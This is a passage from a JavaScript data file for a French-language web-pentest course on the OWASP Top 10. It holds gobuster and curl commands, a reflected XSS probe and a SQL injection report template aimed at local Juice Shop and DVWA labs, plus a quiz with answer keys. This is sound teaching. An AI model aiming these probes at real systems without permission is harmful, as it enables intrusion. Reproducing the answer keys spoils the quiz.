            code(`# Cartographier l'application\ngobuster dir -u http://127.0.0.1:3000 \\\n              -w /usr/share/wordlists/dirb/common.txt -t 50\n\n# Regarder les en-têtes HTTP : versions, serveurs, en-têtes de sécurité\ncurl -sI http://127.0.0.1:3000\n# exemple : repérer l'absence de CSP, le serveur Express (Node.js)`),
            h("Étape 2 — Identification des entrées"),
            list(
              "Le champ de recherche (candidat au XSS DOM et à l'injection).",
              "Le formulaire de connexion / inscription (candidat à l'énumération et au brute force).",
              "Les API accessibles : /api/products, /api/users… (candidats aux failles d'accès).",
              "Le panier et le passage de commande (candidats aux failles logiques)."
            ),
            h("Étape 3 — Exploitation ciblée"),
            p(
              "On choisit une piste et on l'exploite proprement. Exemple : tester l'accès à des ressources non autorisées par l'API."
            ),
            code(`# L'API est accessible sans authentification ?\ncurl -s "http://127.0.0.1:3000/api/users"\n# 200 OK avec liste d'utilisateurs → contrôle d'accès insuffisant (A01)\n\n# La recherche réfléchit-elle les entrées ?\ncurl -s "http://127.0.0.1:3000/rest/products/search?q=<script>alert(1)</script>"\n# la réponse contient le payload brut → candidat XSS à confirmer dans le navigateur`),
            h("Étape 4 — Validation et preuve"),
            p(
              "Une faille n'est une faille que prouvée. La preuve, c'est un impact démontré : ici, la lecture de données d'utilisateurs via l'API sans être connecté. On capture les requêtes, les réponses, les impacts. Ce sont les éléments du rapport."
            ),
            h("Étape 5 — Le chaînage"),
            p(
              "La valeur d'un pentest vient souvent des combinaisons : la faille d'accès révèle des comptes, l'un d'eux sert au brute force (hydra), un XSS permet ensuite de voler une session… Enchaîner deux failles simples produit un impact plus grave que chacune seule. Sur Juice Shop, cherche ce genre de scénario : chaque challenge validé te donne un score et des indices sur la suivante."
            ),
            callout(
              "Juice Shop est ton terrain : tout y est permis, c'est une application d'entraînement. La discipline de ce module est de TOUJOURS documenter au fur et à mesure (captures, requêtes, réponses) : c'est exactement ce qu'on attend d'un rapport professionnel.",
              "info"
            ),
            h("En résumé"),
            list(
              "Un pentest est un parcours : reconnaissance, entrées, exploitation, validation, chaînage.",
              "Les preuves (captures, requêtes, réponses) sont le cœur du livrable.",
              "Deux failles simples enchaînées produisent souvent un impact critique."
            )
          ]
        },
        {
          id: "owasp-lecon-27",
          title: "Rédiger un rapport de pentest",
          type: "theory",
          duration: "18 min",
          blocks: [
            h("Une faille sans rapport n'existe pas"),
            p(
              "Le rapport est le livrable du pentest : le client a payé pour savoir ce qui casse, comment le casser, et quoi corriger. Un pentest sans rapport est un exercice de divertissement. Le rapport doit être lisible par deux publics : la direction (risques, coûts, priorités) et les développeurs (reproduction, correction)."
            ),
            h("La structure d'un rapport"),
            list(
              "Résumé exécutif : synthèse en une page pour la direction — nombre de failles, niveau de risque global, top 3 des risques, chiffres clés.",
              "Périmètre : quelles applications, quelles URLs, quels tests autorisés, période, outils.",
              "Méthodologie : comment on a procédé, dans quel ordre, avec quels outils.",
              "Vulnérabilités : le cœur — une section par faille, classée par gravité.",
              "Recommandations : des actions concrètes, hiérarchisées par priorité.",
              "Annexes : preuves complètes (captures, requêtes), références (CWE, OWASP)."
            ),
            h("La fiche d'une vulnérabilité"),
            p(
              "Chaque faille se décrit avec un modèle standard. Voici les champs attendus, que tu retrouveras dans tout rapport de pentest professionnel."
            ),
            code(`Vulnérabilité : Injection SQL (A03)\nURL          : http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1\nGravité      : Critique\nCWE          : CWE-89\nDescription  : le paramètre id est concaténé dans une requête SQL\n              sans paramétrage (leçon 8).\nPreuve       : (capture de la requête et de la réponse)\nImpact       : lecture de la base entière (utilisateurs, hashs).\nExploitation : apostrophe dans id → erreur SQL affichée, puis UNION\n              SELECT extrait la table users.\nCorrection   : requêtes préparées / paramétrage, liste blanche,\n              erreurs génériques côté serveur.\nRéférences   : OWASP A03, CWE-89, cheat sheet SQL injection.`),
            h("La gravité : comment la noter"),
            p(
              "La grille la plus répandue est le CVSS (Common Vulnerability Scoring System), de 0 à 10. Quatre niveaux pratiques : Critique (8-10), Élevée (7-7,9), Moyenne (4-6,9), Faible (0-3,9). La note combine l'exploitabilité (facile ? à distance ? sans authentification ?) et l'impact (données sensibles ? prise de contrôle ?). Deux failles identiques n'ont pas la même note dans un site vitrine et une banque : le contexte compte."
            ),
            callout(
              "La règle d'or du rapport : chaque vulnérabilité doit être reproductible par un développeur à partir du document seul. Si on doit te rappeler pour comprendre une étape, le rapport est incomplet.",
              "warning"
            ),
            h("En résumé"),
            list(
              "Le rapport est le livrable : deux publics, direction et développeurs.",
              "Structure : résumé exécutif, périmètre, méthodologie, vulnérabilités, recommandations, annexes.",
              "Chaque faille : description, preuve, impact, exploitation, correction, références.",
              "La gravité se note avec la grille CVSS (Critique à Faible)."
            )
          ]
        },
        {
          id: "owasp-lecon-28",
          title: "Récapitulatif du niveau 5 — le Top 10 en une page",
          type: "theory",
          duration: "15 min",
          blocks: [
            h("Les dix catégories, les dix réflexes"),
            p(
              "Avant le quiz final, une synthèse. Le Top 10 OWASP 2021 n'est pas une liste de bugs : c'est une liste de causes profondes. Le réflexe à garder est simple — dès qu'une entrée utilisateur touche une action, vérifier à quelle catégorie elle appartient et appliquer la protection correspondante."
            ),
            h("Le Top 10 en une page"),
            list(
              "A01 — Broken Access Control : contrôler l'accès à chaque requête, côté serveur, jamais par l'URL ou la présence du bouton.",
              "A02 — Cryptographic Failures : chiffrer en transit (HTTPS) et au repos, ne jamais stocker de secret en clair.",
              "A03 — Injection : ne jamais concaténer une entrée dans une requête — paramétrer, encoder, liste blanche.",
              "A04 — Insecure Design : les contrôles de sécurité se conçoivent, pas s'ajoutent en fin de projet.",
              "A05 — Security Misconfiguration : tout ce qui n'est pas explicitement sécurisé est par défaut fragile.",
              "A06 — Vulnerable and Outdated Components : mettre à jour, inventorier ses dépendances, suivre les CVE.",
              "A07 — Identification and Authentication Failures : MFA, politiques de mot de passe, pas de messages trop informatifs.",
              "A08 — Software and Data Integrity Failures : vérifier l'intégrité des mises à jour et des pipelines.",
              "A09 — Security Logging and Monitoring Failures : journaliser, surveiller, alerter.",
              "A10 — SSRF : ne jamais laisser le serveur charger une URL fournie par l'utilisateur sans contrôle."
            ),
            h("Les outils associés, en une page"),
            list(
              "curl : explorer, capturer, rejouer une requête.",
              "gobuster : énumérer les répertoires et les sous-domaines.",
              "hydra : tester des mots de passe en masse (brute force).",
              "sqlmap : détecter et exploiter les injections SQL.",
              "john : casser des hashs de mots de passe.",
              "Burp (outils) et navigateur devtools : intercepter, modifier, observer les requêtes."
            ),
            h("La logique du Top 10"),
            p(
              "En 2021, trois catégories sont des causes transverses (A04 conception, A05 misconfiguration, A09 logging) et non des bugs précis. L'OWASP a fusionné XSS dans A03 et CSRF dans A01/A04/A07 : ce qui compte n'est pas l'étiquette exacte d'une faille mais sa cause profonde. Cette cause a toujours la même forme : une décision de conception ou de code qui place la confiance du mauvais côté."
            ),
            callout(
              "Le Top 10 évolue : la version 2017 et la version 2021 diffèrent, et une version 2025 apportera de nouvelles priorités. Ce qui ne change pas : la méthode (tester, prouver, corriger) et les causes profondes. Ce cours t'apprend à reconnaître ces causes, pas une liste figée.",
              "info"
            ),
            h("En résumé"),
            list(
              "Le Top 10 = dix causes profondes, pas dix bugs isolés.",
              "Chaque entrée = un réflexe de protection associé.",
              "Trois catégories transverses en 2021 : conception, configuration, journalisation.",
              "La méthode, les causes profondes et les outils restent valables au-delà d'une version du Top 10."
            )
          ]
        },
        {
          id: "owasp-lecon-29",
          title: "Quiz final — le niveau 5 en 10 questions",
          type: "quiz",
          duration: "15 min",
          blocks: [
            p(
              "Le grand bilan du niveau 5 : 10 questions couvrant les dix catégories, les outils et la méthode. Il faut 80 % pour valider le niveau. Relis les récapitulats des leçons 1 à 28 si besoin : tout ce qui est demandé y a été expliqué."
            ),
            callout(
              "Une question peut croiser deux catégories (exemple : CSRF et A01). Réfléchis à la cause profonde avant de répondre.",
              "info"
            )
          ],
          quiz: [
            {
              question: "L'injection SQL est classée dans le Top 10 2021 sous :",
              options: [
                "A01 — Broken Access Control",
                "A02 — Cryptographic Failures",
                "A03 — Injection",
                "A07 — Identification Failures",
              ],
              answer: 2,
              explanation:
                "A03 Injection regroupe SQLi, XSS, command injection et toute concaténation d'entrée dans une requête interprétée.",
            },
            {
              question: "Un test permettant d'identifier les failles A01 Broken Access Control :",
              options: [
                "Modifier l'id d'une ressource dans l'URL d'un compte à l'autre (IDOR)",
                "Envoyer une apostrophe dans un paramètre",
                "Scanner le réseau avec nmap",
                "Tester les mots de passe par défaut",
              ],
              answer: 0,
              explanation:
                "L'IDOR est l'exemple canonique de A01 : la ressource existe et l'accès n'est pas contrôlé côté serveur.",
            },
            {
              question: "Pourquoi ne pas stocker les mots de passe en clair dans la base ?",
              options: [
                "Cela consomme trop d'espace",
                "En cas de fuite de la base, tous les comptes sont directement compromis",
                "Cela ralentit les requêtes",
                "C'est interdit par le protocole HTTP",
              ],
              answer: 1,
              explanation:
                "En clair, une fuite de base (leçon 22) expose tous les comptes immédiatement. On stocke des hashs lents et salés (bcrypt, Argon2).",
            },
            {
              question: "Quelle protection est la plus efficace contre le brute force des mots de passe ?",
              options: [
                "Un mot de passe très long choisi par l'utilisateur",
                "Limiter les tentatives, verrouiller les comptes et exiger le MFA",
                "Cacher le formulaire de connexion",
                "Changer le nom du champ password",
              ],
              answer: 1,
              explanation:
                "C'est la combinaison « lenteur + verrouillage + facteur supplémentaire » qui rend le brute force inutile (A07).",
            },
            {
              question: "Un XSS stocké est plus dangereux qu'un XSS réfléchi car :",
              options: [
                "Il est plus difficile à corriger",
                "Il s'exécute pour tous les visiteurs de la page, sans action de leur part",
                "Il contourne le HTTPS",
                "Il attaque le serveur directement",
              ],
              answer: 1,
              explanation:
                "Le stocké persiste en base et touche chaque lecteur ; le réfléchi exige de piéger une victime sur un lien.",
            },
            {
              question: "Le jeton CSRF protège contre :",
              options: [
                "L'injection SQL",
                "Une requête inter-sites envoyée avec la session de l'utilisateur",
                "Le vol de mot de passe",
                "Le scan de répertoires",
              ],
              answer: 1,
              explanation:
                "Le jeton vérifie que la requête vient bien du site lui-même : le site malveillant ne peut pas le connaître ni l'envoyer.",
            },
            {
              question: "Une misconfiguration CORS critique est :",
              options: [
                "Access-Control-Allow-Origin absent",
                "Access-Control-Allow-Origin: * avec Access-Control-Allow-Credentials: true",
                "Origin manquant dans la requête",
                "Un cookie sans SameSite",
              ],
              answer: 1,
              explanation:
                "Le * ouvre la lecture à toutes les origines ET les credentials autorisent les cookies : n'importe quel site peut lire les réponses.",
            },
            {
              question: "Quel outil automatisé détecte et exploite l'injection SQL ?",
              options: [
                "hydra",
                "john",
                "sqlmap",
                "gobuster",
              ],
              answer: 2,
              explanation:
                "sqlmap teste les paramètres, détecte le type de base, et extrait les données. Les autres outils : brute force (hydra), hashs (john), répertoires (gobuster).",
            },
            {
              question: "Une SSRF vers 169.254.169.254 est particulièrement critique car :",
              options: [
                "Cette IP bloque tout le trafic",
                "C'est l'adresse du métadata service cloud : elle peut exposer les clés de l'infrastructure",
                "Elle est publique et surchargée",
                "Elle n'est accessible qu'avec un VPN",
              ],
              answer: 1,
              explanation:
                "169.254.169.254 est l'adresse link-local du métadata cloud (AWS/GCP/Azure) : un SSRF vers elle peut voler les clés de l'infrastructure.",
            },
            {
              question: "Dans un rapport de pentest, une vulnérabilité doit être :",
              options: [
                "Une simple liste de failles sans contexte",
                "Reproductible par un développeur : description, preuve, impact, exploitation, correction",
                "Uniquement un score CVSS",
                "Rédigée uniquement pour la direction",
              ],
              answer: 1,
              explanation:
                "La règle d'or : un développeur doit pouvoir reproduire et corriger la faille à partir du rapport seul. Le rapport s'adresse à deux publics : direction et développeurs.",
            },
          ],
        },
        {
          id: "owasp-lecon-30",
          title: "Cap sur le niveau 6",
          type: "theory",
          duration: "8 min",
          blocks: [
            h("Ce que tu as construit jusqu'ici"),
            p(
              "Tu as appris à reconnaître les dix causes profondes du Top 10 OWASP, à les exploiter sur tes labos (DVWA, Juice Shop, labs PortSwigger), à utiliser les outils du métier (curl, gobuster, hydra, sqlmap, john) et à restituer tes résultats dans un rapport professionnel. C'est le socle exact du test d'intrusion web."
            ),
            h("Ce qui vient ensuite"),
            p(
              "Le niveau 6 va s'éloigner de la page web pour couvrir l'infrastructure et les réseaux qui la portent : le serveur, le réseau, le système. Tu y découvriras les méthodes d'un pentest complet — reconnaissance réseau, scan de ports, analyse de services — et tu apprendras à structurer un audit de bout en bout, de la prise de contact à la restitution."
            ),
            h("Pourquoi c'est le bon enchaînement"),
            list(
              "Une faille web s'exploite à travers une infrastructure : savoir lire un réseau, c'est savoir atteindre la cible (A10 le montrait déjà).",
              "Le vocabulaire technique que tu as acquis ici — requêtes, sessions, cookies, ports — est exactement celui du niveau 6.",
              "La méthode (tester, prouver, corriger, rapporter) ne change pas : seuls le périmètre et les outils changent."
            ),
            callout(
              "Bravo pour le niveau 5 ! Garde ton carnet de bord : les notes que tu as prises (payloads, méthode en 6 étapes, structure de rapport) vont te servir immédiatement au niveau 6.",
              "tip"
            ),
            h("En résumé"),
            list(
              "Niveau 5 = le Top 10 OWASP, ses dix causes profondes, leurs protections et leurs outils.",
              "Niveau 6 = l'infrastructure : serveur, réseau, système — le pentest complet.",
              "La méthode ne change pas : tu enrichis ton terrain d'application."
            )
          ]
        },
      ],
    },
  ],
};
